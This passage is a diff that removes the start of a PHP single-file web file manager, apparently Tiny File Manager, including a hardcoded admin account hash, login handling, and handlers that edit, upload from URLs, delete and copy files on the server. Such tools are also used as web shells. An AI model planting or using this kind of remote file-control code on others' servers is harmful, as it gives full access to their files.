@@ -1,4310 +1,2540 @@
 <?php
-//Default Configuration
-$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
-
-/**
- * H3K | Tiny File Manager V2.5.3
- * @author CCP Programmers
- * @github https://github.com/prasathmani/tinyfilemanager
- * @link https://tinyfilemanager.github.io
- */
-
-//TFM version
-define('VERSION', '2.5.3');
-
-//Application Title
-define('APP_TITLE', 'Tiny File Manager');
-
-// --- EDIT BELOW CONFIGURATION CAREFULLY ---
-
-// Auth with login/password
-// set true/false to enable/disable it
-// Is independent from IP white- and blacklisting
-$use_auth = true;
-
-// Login user name and password
-// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
-// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
-$auth_users = array(
-    'wadmin' => '$2y$10$mWUD2oqP2b36YKqpuzsDp.ONLhhRsXQx2N.Oxoare1ON0IhDkpVzW'
-);
-
-// Readonly users
-// e.g. array('users', 'guest', ...)
-$readonly_users = array(
-    'user'
-);
-
-// Global readonly, including when auth is not being used
-$global_readonly = false;
-
-// user specific directories
-// array('Username' => 'Directory path', 'Username2' => 'Directory path', ...)
-$directories_users = array();
-
-// Enable highlight.js (https://highlightjs.org/) on view's page
-$use_highlightjs = true;
-
-// highlight.js style
-// for dark theme use 'ir-black'
-$highlightjs_style = 'vs';
-
-// Enable ace.js (https://ace.c9.io/) on view's page
-$edit_files = true;
-
-// Default timezone for date() and time()
-// Doc - http://php.net/manual/en/timezones.php
-$default_timezone = 'Etc/UTC'; // UTC
-
-// Root path for file manager
-// use absolute path of directory i.e: '/var/www/folder' or $_SERVER['DOCUMENT_ROOT'].'/folder'
-$root_path = $_SERVER['DOCUMENT_ROOT'];
-
-// Root url for links in file manager.Relative to $http_host. Variants: '', 'path/to/subfolder'
-// Will not working if $root_path will be outside of server document root
-$root_url = '';
-
-// Server hostname. Can set manually if wrong
-// $_SERVER['HTTP_HOST'].'/folder'
-$http_host = $_SERVER['HTTP_HOST'];
-
-// input encoding for iconv
-$iconv_input_encoding = 'UTF-8';
-
-// date() format for file modification date
-// Doc - https://www.php.net/manual/en/function.date.php
-$datetime_format = 'm/d/Y g:i A';
-
-// Path display mode when viewing file information
-// 'full' => show full path
-// 'relative' => show path relative to root_path
-// 'host' => show path on the host
-$path_display_mode = 'full';
-
-// Allowed file extensions for create and rename files
-// e.g. 'txt,html,css,js'
-$allowed_file_extensions = '';
-
-// Allowed file extensions for upload files
-// e.g. 'gif,png,jpg,html,txt'
-$allowed_upload_extensions = '';
-
-// Favicon path. This can be either a full url to an .PNG image, or a path based on the document root.
-// full path, e.g http://example.com/favicon.png
-// local path, e.g images/icons/favicon.png
-$favicon_path = '';
-
-// Files and folders to excluded from listing
-// e.g. array('myfile.html', 'personal-folder', '*.php', ...)
-$exclude_items = array();
-
-// Online office Docs Viewer
-// Available rules are 'google', 'microsoft' or false
-// Google => View documents using Google Docs Viewer
-// Microsoft => View documents using Microsoft Web Apps Viewer
-// false => disable online doc viewer
-$online_viewer = 'google';
-
-// Sticky Nav bar
-// true => enable sticky header
-// false => disable sticky header
-$sticky_navbar = true;
-
-// Maximum file upload size
-// Increase the following values in php.ini to work properly
-// memory_limit, upload_max_filesize, post_max_size
-$max_upload_size_bytes = 5000000000; // size 5,000,000,000 bytes (~5GB)
-
-// chunk size used for upload
-// eg. decrease to 1MB if nginx reports problem 413 entity too large
-$upload_chunk_size_bytes = 2000000; // chunk size 2,000,000 bytes (~2MB)
-
-// Possible rules are 'OFF', 'AND' or 'OR'
-// OFF => Don't check connection IP, defaults to OFF
-// AND => Connection must be on the whitelist, and not on the blacklist
-// OR => Connection must be on the whitelist, or not on the blacklist
-$ip_ruleset = 'OFF';
-
-// Should users be notified of their block?
-$ip_silent = true;
-
-// IP-addresses, both ipv4 and ipv6
-$ip_whitelist = array(
-    '127.0.0.1',    // local ipv4
-    '::1'           // local ipv6
-);
-
-// IP-addresses, both ipv4 and ipv6
-$ip_blacklist = array(
-    '0.0.0.0',      // non-routable meta ipv4
-    '::'            // non-routable meta ipv6
-);
-
-// if User has the external config file, try to use it to override the default config above [config.php]
-// sample config - https://tinyfilemanager.github.io/config-sample.txt
-$config_file = __DIR__.'/config.php';
-if (is_readable($config_file)) {
-    @include($config_file);
-}
-
-// External CDN resources that can be used in the HTML (replace for GDPR compliance)
-$external = array(
-    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
-    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
-    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
-    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/' . $highlightjs_style . '.min.css">',
-    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>',
-    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>',
-    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
-    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
-    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
-    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>',
-    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
-    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
-);
-
-// --- EDIT BELOW CAREFULLY OR DO NOT EDIT AT ALL ---
-
-// max upload file size
-define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);
-
-// upload chunk size
-define('UPLOAD_CHUNK_SIZE', $upload_chunk_size_bytes);
-
-// private key and session name to store to the session
-if ( !defined( 'FM_SESSION_ID')) {
-    define('FM_SESSION_ID', 'filemanager');
-}
-
-// Configuration
-$cfg = new FM_Config();
-
-// Default language
-$lang = isset($cfg->data['lang']) ? $cfg->data['lang'] : 'en';
-
-// Show or hide files and folders that starts with a dot
-$show_hidden_files = isset($cfg->data['show_hidden']) ? $cfg->data['show_hidden'] : true;
-
-// PHP error reporting - false = Turns off Errors, true = Turns on Errors
-$report_errors = isset($cfg->data['error_reporting']) ? $cfg->data['error_reporting'] : true;
-
-// Hide Permissions and Owner cols in file-listing
-$hide_Cols = isset($cfg->data['hide_Cols']) ? $cfg->data['hide_Cols'] : true;
-
-// Theme
-$theme = isset($cfg->data['theme']) ? $cfg->data['theme'] : 'light';
-
-define('FM_THEME', $theme);
-
-//available languages
-$lang_list = array(
-    'en' => 'English'
-);
-
-if ($report_errors == true) {
-    @ini_set('error_reporting', E_ALL);
-    @ini_set('display_errors', 1);
-} else {
-    @ini_set('error_reporting', E_ALL);
-    @ini_set('display_errors', 0);
-}
-
-// if fm included
-if (defined('FM_EMBED')) {
-    $use_auth = false;
-    $sticky_navbar = false;
-} else {
-    @set_time_limit(600);
-
-    date_default_timezone_set($default_timezone);
-
-    ini_set('default_charset', 'UTF-8');
-    if (version_compare(PHP_VERSION, '5.6.0', '<') && function_exists('mb_internal_encoding')) {
-        mb_internal_encoding('UTF-8');
-    }
-    if (function_exists('mb_regex_encoding')) {
-        mb_regex_encoding('UTF-8');
-    }
-
-    session_cache_limiter('nocache'); // Prevent logout issue after page was cached
-    session_name(FM_SESSION_ID );
-    function session_error_handling_function($code, $msg, $file, $line) {
-        // Permission denied for default session, try to create a new one
-        if ($code == 2) {
-            session_abort();
-            session_id(session_create_id());
-            @session_start();
-        }
-    }
-    set_error_handler('session_error_handling_function');
-    session_start();
-    restore_error_handler();
-}
-
-//Generating CSRF Token
-if (empty($_SESSION['token'])) {
-    if (function_exists('random_bytes')) {
-        $_SESSION['token'] = bin2hex(random_bytes(32));
-    } else {
-    	$_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
-    }
-}
-
-if (empty($auth_users)) {
-    $use_auth = false;
-}
-
-$is_https = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
-    || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https';
-
-// update $root_url based on user specific directories
-if (isset($_SESSION[FM_SESSION_ID]['logged']) && !empty($directories_users[$_SESSION[FM_SESSION_ID]['logged']])) {
-    $wd = fm_clean_path(dirname($_SERVER['PHP_SELF']));
-    $root_url =  $root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[FM_SESSION_ID]['logged']];
-}
-// clean $root_url
-$root_url = fm_clean_path($root_url);
-
-// abs path for site
-defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
-defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);
-
-// logout
-if (isset($_GET['logout'])) {
-    unset($_SESSION[FM_SESSION_ID]['logged']);
-    unset( $_SESSION['token']); 
-    fm_redirect(FM_SELF_URL);
-}
-
-// Validate connection IP
-if ($ip_ruleset != 'OFF') {
-    function getClientIP() {
-        if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
-            return  $_SERVER["HTTP_CF_CONNECTING_IP"];
-        }else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
-            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
-        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
-            return $_SERVER['REMOTE_ADDR'];
-        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
-            return $_SERVER['HTTP_CLIENT_IP'];
-        }
-        return '';
-    }
-
-    $clientIp = getClientIP();
-    $proceed = false;
-    $whitelisted = in_array($clientIp, $ip_whitelist);
-    $blacklisted = in_array($clientIp, $ip_blacklist);
-
-    if($ip_ruleset == 'AND'){
-        if($whitelisted == true && $blacklisted == false){
-            $proceed = true;
-        }
-    } else
-    if($ip_ruleset == 'OR'){
-         if($whitelisted == true || $blacklisted == false){
-            $proceed = true;
-        }
-    }
-
-    if($proceed == false){
-        trigger_error('User connection denied from: ' . $clientIp, E_USER_WARNING);
-
-        if($ip_silent == false){
-            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
-            fm_show_header_login();
-            fm_show_message();
-        }
-        exit();
-    }
-}
-
-// Checking if the user is logged in or not. If not, it will show the login form.
-if ($use_auth) {
-    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
-        // Logged
-    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
-        // Logging In
-        sleep(1);
-        if(function_exists('password_verify')) {
-            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
-                $_SESSION[FM_SESSION_ID]['logged'] = $_POST['fm_usr'];
-                fm_set_msg(lng('You are logged in'));
-                fm_redirect(FM_SELF_URL);
-            } else {
-                unset($_SESSION[FM_SESSION_ID]['logged']);
-                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
-                fm_redirect(FM_SELF_URL);
-            }
-        } else {
-            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
-        }
-    } else {
-        // Form
-        unset($_SESSION[FM_SESSION_ID]['logged']);
-        fm_show_header_login();
-        ?>
-        <section class="h-100">
-            <div class="container h-100">
-                <div class="row justify-content-md-center h-100">
-                    <div class="card-wrapper">
-                        <div class="card fat <?php echo fm_get_theme(); ?>">
-                            <div class="card-body">
-                                <form class="form-signin" action="" method="post" autocomplete="off">
-                                    <div class="mb-3">
-                                       <div class="brand">
-                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
-                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
-                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
-                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
-                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
-                                            </svg>
-                                        </div>
-                                        <div class="text-center">
-                                            <h1 class="card-title"><?php echo APP_TITLE; ?></h1>
-                                        </div>
-                                    </div>
-                                    <hr />
-                                    <div class="mb-3">
-                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username'); ?></label>
-                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
-                                    </div>
-
-                                    <div class="mb-3">
-                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password'); ?></label>
-                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
-                                    </div>
-
-                                    <div class="mb-3">
-                                        <?php fm_show_message(); ?>
-                                    </div>
-                                    <input type="hidden" name="token" value="<?php echo htmlentities($_SESSION['token']); ?>" />
-                                    <div class="mb-3">
-                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
-                                            <?php echo lng('Login'); ?>
-                                        </button>
-                                    </div>
-                                </form>
-                            </div>
-                        </div>
-                        <div class="footer text-center">
-                            &mdash;&mdash; &copy;
-                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <?php
-        fm_show_footer_login();
-        exit;
-    }
-}
-
-// update root path
-if ($use_auth && isset($_SESSION[FM_SESSION_ID]['logged'])) {
-    $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]['logged']]) ? $directories_users[$_SESSION[FM_SESSION_ID]['logged']] : $root_path;
-}
-
-// clean and check $root_path
-$root_path = rtrim($root_path, '\\/');
-$root_path = str_replace('\\', '/', $root_path);
-if (!@is_dir($root_path)) {
-    echo "<h1>".lng('Root path')." \"{$root_path}\" ".lng('not found!')." </h1>";
-    exit;
-}
-
-defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $show_hidden_files);
-defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
-defined('FM_LANG') || define('FM_LANG', $lang);
-defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $allowed_file_extensions);
-defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $allowed_upload_extensions);
-defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($exclude_items) : $exclude_items));
-defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $online_viewer);
-define('FM_READONLY', $global_readonly || ($use_auth && !empty($readonly_users) && isset($_SESSION[FM_SESSION_ID]['logged']) && in_array($_SESSION[FM_SESSION_ID]['logged'], $readonly_users)));
-define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');
-
-// always use ?p=
-if (!isset($_GET['p']) && empty($_FILES)) {
-    fm_redirect(FM_SELF_URL . '?p=');
-}
-
-// get path
-$p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');
-
-// clean path
-$p = fm_clean_path($p);
-
-// for ajax request - save
-$input = file_get_contents('php://input');
-$_POST = (strpos($input, 'ajax') != FALSE && strpos($input, 'save') != FALSE) ? json_decode($input, true) : $_POST;
-
-// instead globals vars
-define('FM_PATH', $p);
-define('FM_USE_AUTH', $use_auth);
-define('FM_EDIT_FILE', $edit_files);
-defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
-defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $use_highlightjs);
-defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $highlightjs_style);
-defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);
-
-unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);
-
-/*************************** ACTIONS ***************************/
-
-// Handle all AJAX Request
-if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset($_POST['ajax'], $_POST['token']) && !FM_READONLY) {
-    if(!verifyToken($_POST['token'])) {
-        header('HTTP/1.0 401 Unauthorized');
-        die("Invalid Token.");
-    }
-
-    //search : get list of files from the current folder
-    if(isset($_POST['type']) && $_POST['type']=="search") {
-        $dir = $_POST['path'] == "." ? '': $_POST['path'];
-        $response = scan(fm_clean_path($dir), $_POST['content']);
-        echo json_encode($response);
-        exit();
-    }
-
-    // save editor file
-    if (isset($_POST['type']) && $_POST['type'] == "save") {
-        // get current path
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-        // check path
-        if (!is_dir($path)) {
-            fm_redirect(FM_SELF_URL . '?p=');
-        }
-        $file = $_GET['edit'];
-        $file = fm_clean_path($file);
-        $file = str_replace('/', '', $file);
-        if ($file == '' || !is_file($path . '/' . $file)) {
-            fm_set_msg(lng('File not found'), 'error');
-            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-        }
-        header('X-XSS-Protection:0');
-        $file_path = $path . '/' . $file;
-
-        $writedata = $_POST['content'];
-        $fd = fopen($file_path, "w");
-        $write_results = @fwrite($fd, $writedata);
-        fclose($fd);
-        if ($write_results === false){
-            header("HTTP/1.1 500 Internal Server Error");
-            die("Could Not Write File! - Check Permissions / Ownership");
-        }
-        die(true);
-    }
-
-    // backup files
-    if (isset($_POST['type']) && $_POST['type'] == "backup" && !empty($_POST['file'])) {
-        $fileName = fm_clean_path($_POST['file']);
-        $fullPath = FM_ROOT_PATH . '/';
-        if (!empty($_POST['path'])) {
-            $relativeDirPath = fm_clean_path($_POST['path']);
-            $fullPath .= "{$relativeDirPath}/";
-        }
-        $date = date("dMy-His");
-        $newFileName = "{$fileName}-{$date}.bak";
-        $fullyQualifiedFileName = $fullPath . $fileName;
-        try {
-            if (!file_exists($fullyQualifiedFileName)) {
-                throw new Exception("File {$fileName} not found");
-            }
-            if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) {
-                echo "Backup {$newFileName} created";
-            } else {
-                throw new Exception("Could not copy file {$fileName}");
-            }
-        } catch (Exception $e) {
-            echo $e->getMessage();
-        }
-    }
-
-    // Save Config
-    if (isset($_POST['type']) && $_POST['type'] == "settings") {
-        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
-        $newLng = $_POST['js-language'];
-        fm_get_translations([]);
-        if (!array_key_exists($newLng, $lang_list)) {
-            $newLng = 'en';
-        }
-
-        $erp = isset($_POST['js-error-report']) && $_POST['js-error-report'] == "true" ? true : false;
-        $shf = isset($_POST['js-show-hidden']) && $_POST['js-show-hidden'] == "true" ? true : false;
-        $hco = isset($_POST['js-hide-cols']) && $_POST['js-hide-cols'] == "true" ? true : false;
-        $te3 = $_POST['js-theme-3'];
-
-        if ($cfg->data['lang'] != $newLng) {
-            $cfg->data['lang'] = $newLng;
-            $lang = $newLng;
-        }
-        if ($cfg->data['error_reporting'] != $erp) {
-            $cfg->data['error_reporting'] = $erp;
-            $report_errors = $erp;
-        }
-        if ($cfg->data['show_hidden'] != $shf) {
-            $cfg->data['show_hidden'] = $shf;
-            $show_hidden_files = $shf;
-        }
-        if ($cfg->data['show_hidden'] != $shf) {
-            $cfg->data['show_hidden'] = $shf;
-            $show_hidden_files = $shf;
-        }
-        if ($cfg->data['hide_Cols'] != $hco) {
-            $cfg->data['hide_Cols'] = $hco;
-            $hide_Cols = $hco;
-        }
-        if ($cfg->data['theme'] != $te3) {
-            $cfg->data['theme'] = $te3;
-            $theme = $te3;
-        }
-        $cfg->save();
-        echo true;
-    }
-
-    // new password hash
-    if (isset($_POST['type']) && $_POST['type'] == "pwdhash") {
-        $res = isset($_POST['inputPassword2']) && !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
-        echo $res;
-    }
-
-    //upload using url
-    if(isset($_POST['type']) && $_POST['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-
-         function event_callback ($message) {
-            global $callback;
-            echo json_encode($message);
-        }
-
-        function get_file_path () {
-            global $path, $fileinfo, $temp_file;
-            return $path."/".basename($fileinfo->name);
-        }
-
-        $url = !empty($_REQUEST["uploadurl"]) && preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;
-
-        //prevent 127.* domain and known ports
-        $domain = parse_url($url, PHP_URL_HOST);
-        $port = parse_url($url, PHP_URL_PORT);
-        $knownPorts = [22, 23, 25, 3306];
-
-        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain) || in_array($port, $knownPorts)) {
-            $err = array("message" => "URL is not allowed");
-            event_callback(array("fail" => $err));
-            exit();
-        }
-
-        $use_curl = false;
-        $temp_file = tempnam(sys_get_temp_dir(), "upload-");
-        $fileinfo = new stdClass();
-        $fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");
-
-        $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
-        $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
-        $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;
-
-        $err = false;
-
-        if(!$isFileAllowed) {
-            $err = array("message" => "File extension is not allowed");
-            event_callback(array("fail" => $err));
-            exit();
-        }
-
-        if (!$url) {
-            $success = false;
-        } else if ($use_curl) {
-            @$fp = fopen($temp_file, "w");
-            @$ch = curl_init($url);
-            curl_setopt($ch, CURLOPT_NOPROGRESS, false );
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-            curl_setopt($ch, CURLOPT_FILE, $fp);
-            @$success = curl_exec($ch);
-            $curl_info = curl_getinfo($ch);
-            if (!$success) {
-                $err = array("message" => curl_error($ch));
-            }
-            @curl_close($ch);
-            fclose($fp);
-            $fileinfo->size = $curl_info["size_download"];
-            $fileinfo->type = $curl_info["content_type"];
-        } else {
-            $ctx = stream_context_create();
-            @$success = copy($url, $temp_file, $ctx);
-            if (!$success) {
-                $err = error_get_last();
-            }
-        }
-
-        if ($success) {
-            $success = rename($temp_file, strtok(get_file_path(), '?'));
-        }
-
-        if ($success) {
-            event_callback(array("done" => $fileinfo));
-        } else {
-            unlink($temp_file);
-            if (!$err) {
-                $err = array("message" => "Invalid url parameter");
-            }
-            event_callback(array("fail" => $err));
-        }
-    }
-    exit();
-}
-
-// Delete file / folder
-if (isset($_GET['del'], $_POST['token']) && !FM_READONLY) {
-    $del = str_replace( '/', '', fm_clean_path( $_GET['del'] ) );
-    if ($del != '' && $del != '..' && $del != '.' && verifyToken($_POST['token'])) {
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-        $is_dir = is_dir($path . '/' . $del);
-        if (fm_rdelete($path . '/' . $del)) {
-            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('Deleted') : lng('File').' <b>%s</b> '.lng('Deleted');
-            fm_set_msg(sprintf($msg, fm_enc($del)));
-        } else {
-            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('not deleted') : lng('File').' <b>%s</b> '.lng('not deleted');
-            fm_set_msg(sprintf($msg, fm_enc($del)), 'error');
-        }
-    } else {
-        fm_set_msg(lng('Invalid file or folder name'), 'error');
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Create a new file/folder
-if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) && !FM_READONLY) {
-    $type = urldecode($_POST['newfile']);
-    $new = str_replace( '/', '', fm_clean_path( strip_tags( $_POST['newfilename'] ) ) );
-    if (fm_isvalid_filename($new) && $new != '' && $new != '..' && $new != '.' && verifyToken($_POST['token'])) {
-        $path = FM_ROOT_PATH;
-        if (FM_PATH != '') {
-            $path .= '/' . FM_PATH;
-        }
-        if ($type == "file") {
-            if (!file_exists($path . '/' . $new)) {
-                if(fm_is_valid_ext($new)) {
-                    @fopen($path . '/' . $new, 'w') or die('Cannot open file:  ' . $new);
-                    fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('Created'), fm_enc($new)));
-                } else {
-                    fm_set_msg(lng('File extension is not allowed'), 'error');
-                }
-            } else {
-                fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('already exists'), fm_enc($new)), 'alert');
-            }
-        } else {
-            if (fm_mkdir($path . '/' . $new, false) === true) {
-                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('Created'), $new));
-            } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
-                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('already exists'), fm_enc($new)), 'alert');
-            } else {
-                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('not created'), fm_enc($new)), 'error');
-            }
-        }
-    } else {
-        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
-    }
-    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-}
-
-// Copy folder / file
-if (isset($_GET['copy'], $_GET['finish']) && !FM_READONLY) {
-    // from
-    $copy = urldecode($_GET['copy']);
-    $copy = fm_clean_path($copy);
-    // empty path
-    if ($copy == '') {
-        fm_set_msg(lng('Source path not defined'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-    }
-    // abs path from
-    $from = FM_ROOT_PATH . '/' . $copy;
-    // abs path to
-    $dest = FM_ROOT_PATH;
-    if (FM_PATH != '') {
-        $dest .= '/' . FM_PATH;
-    }
-    $dest .= '/' . basename($from);
-    // move?
-    $move = isset($_GET['move']);
-    $move = fm_clean_path(urldecode($move));
-    // copy/move/duplicate
-    if ($from != $dest) {
-        $msg_from = trim(FM_PATH . '/' . basename($from), '/');
-        if ($move) { // Move and to != from so just perform move
-            $rename = fm_rename($from, $dest);
-            if ($rename) {
-                fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
-            } elseif ($rename === null) {
-                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
-            } else {
-                fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
-            }
-        } else { // Not move and to != from so copy with original name
-            if (fm_rcopy($from, $dest)) {
-                fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)));
-            } else {
-                fm_set_msg(sprintf(lng('Error while copying from').' <b>%s</b> '.lng('to').' <b>%s</b>', fm_enc($copy), fm_enc($msg_from)), 'error');
-            }
-        }
-    } else {
-       if (!$move){ //Not move and to = from so duplicate
-            $msg_from = trim(FM_PATH . '/' . basename($from), '/');
-            $fn_parts = pathinfo($from);
-            $extension_suffix = '';
-            if(!is_dir($from)){
-               $extension_suffix = '.'.$fn_parts['extension'];
-            }
-            //Create new name for duplicate
-            $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-'.date('YmdHis').$extension_suffix;
-            $loop_count = 0;
-            $max_loop = 1000;
